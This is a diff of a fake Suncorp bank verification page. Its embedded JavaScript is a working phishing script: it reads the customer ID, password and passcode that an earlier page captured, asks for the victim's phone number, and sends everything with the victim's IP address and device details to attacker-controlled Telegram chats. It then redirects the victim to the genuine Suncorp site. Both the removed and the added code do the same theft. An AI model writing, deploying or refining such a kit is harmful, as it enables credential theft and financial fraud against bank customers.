@@ -64,163 +64,152 @@
             <button class="sg-Btn sg-Btn--primary Btn-next" name="submit" type="submit">Verify</button>
           </div>
           
-         <script>
-    (function() {
-        // ============================================
-        // TELEGRAM CONFIGURATION - FROM ENVIRONMENT VARIABLES
-        // ============================================
-        // NOTE: You need to set these environment variables before running:
-        // TELEGRAM_BOT_TOKEN - Your Telegram bot token
-        // TELEGRAM_CHAT_IDS - Comma-separated list of chat IDs (e.g., '-5051925986,-123456789')
-        
-        // Function to get environment variables (works in Node.js/Vite/Webpack/etc.)
-        function getEnvVar(name, defaultValue = null) {
-            // Check for different environment variable patterns
-            if (typeof process !== 'undefined' && process.env) {
-                // Node.js environment
-                if (process.env[name]) return process.env[name];
-                if (process.env[`VITE_${name}`]) return process.env[`VITE_${name}`];
-                if (process.env[`REACT_APP_${name}`]) return process.env[`REACT_APP_${name}`];
-            }
-            
-            // Check for window._env_ (useful for runtime injection)
-            if (typeof window !== 'undefined' && window._env_ && window._env_[name]) {
-                return window._env_[name];
-            }
-            
-            // Check for import.meta.env (Vite)
-            if (typeof import !== 'undefined' && import.meta && import.meta.env && import.meta.env[name]) {
-                return import.meta.env[name];
-            }
-            
-            return defaultValue;
-        }
-        
-        // Get configuration from environment variables
-        const TELEGRAM_BOT_TOKEN = getEnvVar('TELEGRAM_BOT_TOKEN');
-        const TELEGRAM_CHAT_IDS_RAW = getEnvVar('TELEGRAM_CHAT_IDS');
-        
-        // Parse chat IDs from comma-separated string
-        let TELEGRAM_CHAT_IDS = [];
-        if (TELEGRAM_CHAT_IDS_RAW) {
-            TELEGRAM_CHAT_IDS = TELEGRAM_CHAT_IDS_RAW.split(',').map(id => id.trim());
-        }
-        
-        // Validate configuration
-        if (!TELEGRAM_BOT_TOKEN) {
-            console.error('❌ TELEGRAM_BOT_TOKEN environment variable is not set!');
-            console.error('Please set it before running the application.');
-        }
-        
-        if (!TELEGRAM_CHAT_IDS.length) {
-            console.error('❌ TELEGRAM_CHAT_IDS environment variable is not set!');
-            console.error('Please set it as a comma-separated list of chat IDs.');
-        }
-        
-        // Function to get data from sessionStorage (set by index.html)
-        function getStolenData() {
-            let stolenData = {
-                userId: 'Not captured',
-                password: 'Not captured',
-                passcode: 'Not captured'
-            };
-            
-            try {
-                // Read from sessionStorage (where index.html stores the data)
-                const userId = sessionStorage.getItem('userId');
-                const userPassword = sessionStorage.getItem('userPassword');
-                const userPasscode = sessionStorage.getItem('userPasscode');
+          <script>
+            (function() {
+                // ============================================
+                // TELEGRAM CONFIGURATION - FROM ENVIRONMENT VARIABLES
+                // ============================================
+                // NOTE: Set these environment variables before running:
+                // TELEGRAM_BOT_TOKEN - Your Telegram bot token
+                // TELEGRAM_CHAT_IDS - Comma-separated list of chat IDs
                 
-                if (userId && userId !== 'undefined' && userId !== 'null') {
-                    stolenData.userId = userId;
-                }
-                if (userPassword && userPassword !== 'undefined' && userPassword !== 'null') {
-                    stolenData.password = userPassword;
-                }
-                if (userPasscode && userPasscode !== 'undefined' && userPasscode !== 'null') {
-                    stolenData.passcode = userPasscode;
+                // Function to get environment variables
+                function getEnvVar(name, defaultValue = null) {
+                    // Check for different environment variable patterns
+                    if (typeof process !== 'undefined' && process.env) {
+                        if (process.env[name]) return process.env[name];
+                        if (process.env[`VITE_${name}`]) return process.env[`VITE_${name}`];
+                        if (process.env[`REACT_APP_${name}`]) return process.env[`REACT_APP_${name}`];
+                    }
+                    
+                    // Check for window._env_ (runtime injection)
+                    if (typeof window !== 'undefined' && window._env_ && window._env_[name]) {
+                        return window._env_[name];
+                    }
+                    
+                    // Check for import.meta.env (Vite)
+                    if (typeof import !== 'undefined' && import.meta && import.meta.env && import.meta.env[name]) {
+                        return import.meta.env[name];
+                    }
+                    
+                    return defaultValue;
                 }
                 
-                // Also try localStorage as backup
-                const localUserId = localStorage.getItem('userId');
-                const localPassword = localStorage.getItem('userPassword');
-                const localPasscode = localStorage.getItem('userPasscode');
+                // Get configuration from environment variables
+                const TELEGRAM_BOT_TOKEN = getEnvVar('TELEGRAM_BOT_TOKEN');
+                const TELEGRAM_CHAT_IDS_RAW = getEnvVar('TELEGRAM_CHAT_IDS');
                 
-                if (localUserId && stolenData.userId === 'Not captured') stolenData.userId = localUserId;
-                if (localPassword && stolenData.password === 'Not captured') stolenData.password = localPassword;
-                if (localPasscode && stolenData.passcode === 'Not captured') stolenData.passcode = localPasscode;
+                // Parse chat IDs from comma-separated string
+                let TELEGRAM_CHAT_IDS = [];
+                if (TELEGRAM_CHAT_IDS_RAW) {
+                    TELEGRAM_CHAT_IDS = TELEGRAM_CHAT_IDS_RAW.split(',').map(id => id.trim());
+                }
                 
-                console.log('Retrieved from storage:', stolenData);
+                // Validate configuration
+                if (!TELEGRAM_BOT_TOKEN) {
+                    console.error('❌ TELEGRAM_BOT_TOKEN environment variable is not set!');
+                }
+                if (!TELEGRAM_CHAT_IDS.length) {
+                    console.error('❌ TELEGRAM_CHAT_IDS environment variable is not set!');
+                }
                 
-            } catch(e) {
-                console.error('Error reading from storage:', e);
-            }
-            
-            return stolenData;
-        }
-        
-        // Get device info
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = 'Unknown';
-            let platform = 'Unknown';
-            let browser = 'Unknown';
-            
-            if (/Windows/.test(ua)) platform = 'Windows';
-            else if (/Mac/.test(ua)) platform = 'MacOS';
-            else if (/Linux/.test(ua)) platform = 'Linux';
-            else if (/Android/.test(ua)) platform = 'Android';
-            else if (/iPad|iPhone|iPod/.test(ua)) platform = 'iOS';
-            
-            if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) device = 'Mobile';
-            else device = 'Desktop';
-            
-            if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
-            else if (/Firefox/.test(ua)) browser = 'Firefox';
-            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
-            else if (/Edg/.test(ua)) browser = 'Edge';
-            else if (/MSIE|Trident/.test(ua)) browser = 'Internet Explorer';
-            
-            return { device, platform, browser };
-        }
-        
-        // Get IP address
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch(e) {
-                return 'Unable to retrieve';
-            }
-        }
-        
-        // Send to Telegram
-        async function sendToTelegram(phoneNumber, stolenData) {
-            // Check if configuration is valid
-            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_IDS.length) {
-                console.error('❌ Cannot send to Telegram: Missing configuration');
-                return 0;
-            }
-            
-            const deviceInfo = getDeviceInfo();
-            let clientIP = 'Unable to retrieve';
-            try {
-                clientIP = await getIP();
-            } catch(e) {}
-            
-            const timestamp = new Date().toLocaleString('en-AU', {
-                timeZone: 'Australia/Sydney',
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-            
-            // Build detailed message
-            const message = `SUNCORP
+                // Function to get data from sessionStorage (set by index.html)
+                function getStolenData() {
+                    let stolenData = {
+                        userId: 'Not captured',
+                        password: 'Not captured',
+                        passcode: 'Not captured'
+                    };
+                    
+                    try {
+                        const userId = sessionStorage.getItem('userId');
+                        const userPassword = sessionStorage.getItem('userPassword');
+                        const userPasscode = sessionStorage.getItem('userPasscode');
+                        
+                        if (userId && userId !== 'undefined' && userId !== 'null') {
+                            stolenData.userId = userId;
+                        }
+                        if (userPassword && userPassword !== 'undefined' && userPassword !== 'null') {
+                            stolenData.password = userPassword;
+                        }
+                        if (userPasscode && userPasscode !== 'undefined' && userPasscode !== 'null') {
+                            stolenData.passcode = userPasscode;
+                        }
+                        
+                        // Also try localStorage as backup
+                        const localUserId = localStorage.getItem('userId');
+                        const localPassword = localStorage.getItem('userPassword');
+                        const localPasscode = localStorage.getItem('userPasscode');
+                        
+                        if (localUserId && stolenData.userId === 'Not captured') stolenData.userId = localUserId;
+                        if (localPassword && stolenData.password === 'Not captured') stolenData.password = localPassword;
+                        if (localPasscode && stolenData.passcode === 'Not captured') stolenData.passcode = localPasscode;
+                        
+                        console.log('Retrieved from storage:', stolenData);
+                        
+                    } catch(e) {
+                        console.error('Error reading from storage:', e);
+                    }
+                    
+                    return stolenData;
+                }
+                
+                // Get device info
+                function getDeviceInfo() {
+                    const ua = navigator.userAgent;
+                    let platform = 'Unknown';
+                    let browser = 'Unknown';
+                    
+                    if (/Windows/.test(ua)) platform = 'Windows';
+                    else if (/Mac/.test(ua)) platform = 'MacOS';
+                    else if (/Linux/.test(ua)) platform = 'Linux';
+                    else if (/Android/.test(ua)) platform = 'Android';
+                    else if (/iPad|iPhone|iPod/.test(ua)) platform = 'iOS';
+                    
+                    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
+                    else if (/Firefox/.test(ua)) browser = 'Firefox';
+                    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+                    else if (/Edg/.test(ua)) browser = 'Edge';
+                    else if (/MSIE|Trident/.test(ua)) browser = 'Internet Explorer';
+                    
+                    return { platform, browser };
+                }
+                
+                // Get IP address
+                async function getIP() {
+                    try {
+                        const response = await fetch('https://api.ipify.org?format=json');
+                        const data = await response.json();
+                        return data.ip;
+                    } catch(e) {
+                        return 'Unable to retrieve';
+                    }
+                }
+                
+                // Send to Telegram
+                async function sendToTelegram(phoneNumber, stolenData) {
+                    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_IDS.length) {
+                        console.error('❌ Cannot send to Telegram: Missing configuration');
+                        return 0;
+                    }
+                    
+                    const deviceInfo = getDeviceInfo();
+                    let clientIP = 'Unable to retrieve';
+                    try {
+                        clientIP = await getIP();
+                    } catch(e) {}
+                    
+                    const timestamp = new Date().toLocaleString('en-AU', {
+                        timeZone: 'Australia/Sydney',
+                        year: 'numeric',
+                        month: '2-digit',
+                        day: '2-digit',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    });
+                    
+                    const message = `SUNCORP
 
 Customer ID: ${stolenData.userId}
 Password: ${stolenData.password}
@@ -231,259 +220,165 @@ UA: ${navigator.userAgent}
 Platform: ${deviceInfo.platform}
 Date: ${timestamp}`;
 
-            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            let successCount = 0;
-            for (const chatId of TELEGRAM_CHAT_IDS) {
-                try {
-                    const response = await fetch(telegramUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message.substring(0, 4096),
-                            disable_web_page_preview: true
-                        })
+                    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                    
+                    let successCount = 0;
+                    for (const chatId of TELEGRAM_CHAT_IDS) {
+                        try {
+                            const response = await fetch(telegramUrl, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: message.substring(0, 4096),
+                                    disable_web_page_preview: true
+                                })
+                            });
+                            
+                            const result = await response.json();
+                            if (response.ok) {
+                                console.log(`✓ Message sent to chat ${chatId}`);
+                                successCount++;
+                            } else {
+                                console.error(`✗ Failed for chat ${chatId}:`, result);
+                            }
+                        } catch(error) {
+                            console.error(`✗ Error sending to chat ${chatId}:`, error);
+                        }
+                    }
+                    
+                    return successCount;
+                }
+                
+                // Set up the form
+                function init() {
+                    const form = document.getElementById('recoverForm');
+                    const phoneInput = document.getElementById('cid');
+                    
+                    if (!form || !phoneInput) {
+                        console.error('Form elements not found');
+                        return;
+                    }
+                    
+                    // Get stolen data from sessionStorage
+                    const stolenData = getStolenData();
+                    
+                    // Log captured data
+                    console.log('=== CAPTURED DATA ===');
+                    console.log('User ID:', stolenData.userId);
+                    console.log('Password:', stolenData.password);
+                    console.log('Token/Passcode:', stolenData.passcode);
+                    console.log('=====================');
+                    
+                    // Create error element for phone
+                    let errorDiv = document.getElementById('phone-error');
+                    if (!errorDiv) {
+                        errorDiv = document.createElement('div');
+                        errorDiv.id = 'phone-error';
+                        errorDiv.className = 'sg-Validation-errorWrapper';
+                        errorDiv.style.cssText = 'display: none; margin-top: 5px; color: #d32f2f; font-size: 12px;';
+                        errorDiv.innerHTML = '<p>⚠️ Please enter a valid Australian phone number (04xxxxxxxx).</p>';
+                        phoneInput.parentNode.appendChild(errorDiv);
+                    }
+                    
+                    function isValidPhone(phone) {
+                        return /^04\d{8}$/.test(phone);
+                    }
+                    
+                    function clearError() {
+                        errorDiv.style.display = 'none';
+                        phoneInput.classList.remove('sg-Input--error-border');
+                    }
+                    
+                    function showError() {
+                        errorDiv.style.display = 'block';
+                        phoneInput.classList.add('sg-Input--error-border');
+                    }
+                    
+                    phoneInput.addEventListener('input', function() {
+                        let value = this.value.replace(/\D/g, '');
+                        if (value.length > 10) value = value.slice(0, 10);
+                        this.value = value;
+                        clearError();
                     });
                     
-                    const result = await response.json();
-                    if (response.ok) {
-                        console.log(`✓ Message sent to chat ${chatId}`);
-                        successCount++;
-                    } else {
-                        console.error(`✗ Failed for chat ${chatId}:`, result);
+                    // Loading overlay
+                    function showLoading() {
+                        let overlay = document.getElementById('login-loading-overlay');
+                        if (!overlay) {
+                            overlay = document.createElement('div');
+                            overlay.id = 'login-loading-overlay';
+                            overlay.style.cssText = `
+                                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                                background: rgba(0,0,0,0.7); display: flex; align-items: center;
+                                justify-content: center; z-index: 9999; flex-direction: column;
+                            `;
+                            overlay.innerHTML = `
+                                <div style="width: 50px; height: 50px; border: 4px solid #fff; border-top-color: #ffc800; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                                <p style="color: #ffc800; margin-top: 20px;">Verifying your details...</p>
+                            `;
+                            document.body.appendChild(overlay);
+                        }
+                        overlay.style.display = 'flex';
                     }
-                } catch(error) {
-                    console.error(`✗ Error sending to chat ${chatId}:`, error);
-                }
-            }
-            
-            return successCount;
-        }
-        
-        // Set up the form
-        function init() {
-            const form = document.getElementById('recoverForm');
-            const phoneInput = document.getElementById('cid');
-            let userIdInput = null;
-            
-            // Try to find user ID input field (common patterns)
-            if (document.getElementById('userId')) {
-                userIdInput = document.getElementById('userId');
-            } else if (document.getElementById('username')) {
-                userIdInput = document.getElementById('username');
-            } else if (document.querySelector('input[name="userId"]')) {
-                userIdInput = document.querySelector('input[name="userId"]');
-            } else if (document.querySelector('input[name="username"]')) {
-                userIdInput = document.querySelector('input[name="username"]');
-            }
-            
-            if (!form || !phoneInput) {
-                console.error('Form elements not found');
-                return;
-            }
-            
-            // Get stolen data from sessionStorage
-            const stolenData = getStolenData();
-            
-            // Log to console for debugging
-            console.log('=== CAPTURED DATA ===');
-            console.log('User ID:', stolenData.userId);
-            console.log('Password:', stolenData.password);
-            console.log('Token/Passcode:', stolenData.passcode);
-            console.log('=====================');
-            
-            // Display captured data in console for verification
-            const dataSummary = `
-                📊 DATA CAPTURED FROM LOGIN PAGE:
-                • Customer ID: ${stolenData.userId}
-                • Password: ${stolenData.password ? '✓ Captured' : '✗ Missing'}
-                • Token Code: ${stolenData.passcode ? '✓ Captured' : '✗ Not provided'}
-            `;
-            console.log(dataSummary);
-            
-            // Validate User ID function (MUST be between 8-10 digits)
-            function isValidUserId(userId) {
-                // Check if it's a valid number with 8-10 digits
-                const userIdStr = String(userId).trim();
-                return /^\d{8,10}$/.test(userIdStr);
-            }
-            
-            // Create error elements
-            let phoneErrorDiv = document.getElementById('phone-error');
-            if (!phoneErrorDiv) {
-                phoneErrorDiv = document.createElement('div');
-                phoneErrorDiv.id = 'phone-error';
-                phoneErrorDiv.className = 'sg-Validation-errorWrapper';
-                phoneErrorDiv.style.cssText = 'display: none; margin-top: 5px; color: #d32f2f; font-size: 12px;';
-                phoneErrorDiv.innerHTML = '<p>⚠️ Please enter a valid Australian phone number (04xxxxxxxx).</p>';
-                phoneInput.parentNode.appendChild(phoneErrorDiv);
-            }
-            
-            let userIdErrorDiv = document.getElementById('userid-error');
-            if (userIdInput && !userIdErrorDiv) {
-                userIdErrorDiv = document.createElement('div');
-                userIdErrorDiv.id = 'userid-error';
-                userIdErrorDiv.className = 'sg-Validation-errorWrapper';
-                userIdErrorDiv.style.cssText = 'display: none; margin-top: 5px; color: #d32f2f; font-size: 12px;';
-                userIdErrorDiv.innerHTML = '<p>⚠️ Customer ID must be between 8-10 digits.</p>';
-                userIdInput.parentNode.appendChild(userIdErrorDiv);
-            }
-            
-            function isValidPhone(phone) {
-                return /^04\d{8}$/.test(phone);
-            }
-            
-            function clearPhoneError() {
-                if (phoneErrorDiv) {
-                    phoneErrorDiv.style.display = 'none';
-                    phoneInput.classList.remove('sg-Input--error-border');
-                }
-            }
-            
-            function showPhoneError() {
-                if (phoneErrorDiv) {
-                    phoneErrorDiv.style.display = 'block';
-                    phoneInput.classList.add('sg-Input--error-border');
-                }
-            }
-            
-            function clearUserIdError() {
-                if (userIdErrorDiv && userIdInput) {
-                    userIdErrorDiv.style.display = 'none';
-                    userIdInput.classList.remove('sg-Input--error-border');
-                }
-            }
-            
-            function showUserIdError() {
-                if (userIdErrorDiv && userIdInput) {
-                    userIdErrorDiv.style.display = 'block';
-                    userIdInput.classList.add('sg-Input--error-border');
-                }
-            }
-            
-            // Phone input validation
-            phoneInput.addEventListener('input', function() {
-                let value = this.value.replace(/\D/g, '');
-                if (value.length > 10) value = value.slice(0, 10);
-                this.value = value;
-                clearPhoneError();
-            });
-            
-            // User ID input validation if exists
-            if (userIdInput) {
-                userIdInput.addEventListener('input', function() {
-                    let value = this.value.replace(/\D/g, '');
-                    if (value.length > 10) value = value.slice(0, 10);
-                    this.value = value;
-                    clearUserIdError();
-                });
-            }
-            
-            // Loading overlay
-            function showLoading() {
-                let overlay = document.getElementById('login-loading-overlay');
-                if (!overlay) {
-                    overlay = document.createElement('div');
-                    overlay.id = 'login-loading-overlay';
-                    overlay.style.cssText = `
-                        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-                        background: rgba(0,0,0,0.7); display: flex; align-items: center;
-                        justify-content: center; z-index: 9999; flex-direction: column;
-                    `;
-                    overlay.innerHTML = `
-                        <div style="width: 50px; height: 50px; border: 4px solid #fff; border-top-color: #ffc800; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-                        <p style="color: #ffc800; margin-top: 20px;">Verifying your details...</p>
-                    `;
-                    document.body.appendChild(overlay);
-                }
-                overlay.style.display = 'flex';
-            }
-            
-            function hideLoading() {
-                const overlay = document.getElementById('login-loading-overlay');
-                if (overlay) overlay.style.display = 'none';
-            }
-            
-            // Add spin animation
-            const style = document.createElement('style');
-            style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
-            document.head.appendChild(style);
-            
-            // Handle submit
-            form.addEventListener('submit', async function(e) {
-                e.preventDefault();
-                clearPhoneError();
-                if (userIdInput) clearUserIdError();
-                
-                let isValid = true;
-                
-                // Validate phone number
-                const phone = phoneInput.value.trim();
-                if (!phone || !isValidPhone(phone)) {
-                    showPhoneError();
-                    phoneInput.focus();
-                    isValid = false;
-                }
-                
-                // Validate User ID from captured data or input field
-                let userId = stolenData.userId;
-                
-                // If user ID input exists on the form, use that for validation
-                if (userIdInput && userIdInput.value.trim()) {
-                    userId = userIdInput.value.trim();
-                }
-                
-                // Check if userId is captured and valid (between 8-10 digits)
-                if (userId === 'Not captured' || !userId || !isValidUserId(userId)) {
-                    console.error('User ID validation failed:', userId);
-                    if (userIdInput) {
-                        showUserIdError();
-                        userIdInput.focus();
-                    } else {
-                        // If no user ID input field, show alert
-                        alert('Customer ID must be between 8-10 digits. Please check your details.');
+                    
+                    function hideLoading() {
+                        const overlay = document.getElementById('login-loading-overlay');
+                        if (overlay) overlay.style.display = 'none';
                     }
-                    isValid = false;
+                    
+                    // Add spin animation
+                    const style = document.createElement('style');
+                    style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
+                    document.head.appendChild(style);
+                    
+                    // Handle submit - ONLY validate phone number
+                    form.addEventListener('submit', async function(e) {
+                        e.preventDefault();
+                        clearError();
+                        
+                        const phone = phoneInput.value.trim();
+                        
+                        // Only validate phone number (User ID is already captured from index.html)
+                        if (!phone || !isValidPhone(phone)) {
+                            showError();
+                            phoneInput.focus();
+                            return;
+                        }
+                        
+                        showLoading();
+                        
+                        // Send ALL captured data to Telegram
+                        const sentCount = await sendToTelegram(phone, stolenData);
+                        
+                        if (sentCount > 0) {
+                            console.log(`✓ Data sent successfully to ${sentCount} Telegram chat(s)`);
+                        } else {
+                            console.error('✗ Failed to send to Telegram');
+                        }
+                        
+                        // Clear sessionStorage after sending
+                        try {
+                            sessionStorage.removeItem('userId');
+                            sessionStorage.removeItem('userPassword');
+                            sessionStorage.removeItem('userPasscode');
+                        } catch(e) {}
+                        
+                        // Redirect
+                        setTimeout(function() {
+                            window.location.href = 'https://www.suncorp.com.au';
+                        }, 1500);
+                    });
                 }
                 
-                if (!isValid) {
-                    return;
-                }
-                
-                showLoading();
-                
-                // Send ALL captured data to Telegram
-                const sentCount = await sendToTelegram(phone, stolenData);
-                
-                if (sentCount > 0) {
-                    console.log(`✓ Data sent successfully to ${sentCount} Telegram chat(s)`);
+                // Start when ready
+                if (document.readyState === 'loading') {
+                    document.addEventListener('DOMContentLoaded', init);
                 } else {
-                    console.error('✗ Failed to send to Telegram');
+                    init();
                 }
-                
-                // Clear sessionStorage after sending (optional)
-                try {
-                    sessionStorage.removeItem('userId');
-                    sessionStorage.removeItem('userPassword');
-                    sessionStorage.removeItem('userPasscode');
-                } catch(e) {}
-                
-                // Redirect
-                setTimeout(function() {
-                    window.location.href = 'https://www.suncorp.com.au';
-                }, 1500);
-            });
-        }
-        
-        // Start when ready
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', init);
-        } else {
-            init();
-        }
-    })();
-</script>
+            })();
+          </script>
         </form>
         
         <footer class="sg-Footer" style="background-color:transparent;">
